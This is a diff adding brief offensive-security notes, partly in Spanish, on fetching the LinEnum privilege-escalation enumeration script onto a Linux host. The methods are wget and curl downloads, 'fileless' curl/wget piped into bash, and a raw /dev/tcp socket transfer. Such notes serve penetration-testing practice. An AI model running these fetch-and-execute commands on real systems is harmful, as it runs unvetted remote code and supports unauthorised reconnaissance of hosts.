@@ -1,0 +1,23 @@
+##################################################DOWNLOADS
+
+WGET:
+wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
+
+WGET FILELESS:
+wget -qO- https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
+
+CURL:
+curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+
+CURL FILELESS:
+curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
+
+
+DOWNLOAD CON BASH:
+
+nos conectamos al servidor:
+exec 3<>/dev/tcp/IP/PUERTO
+
+decargamos via get:
+echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
+
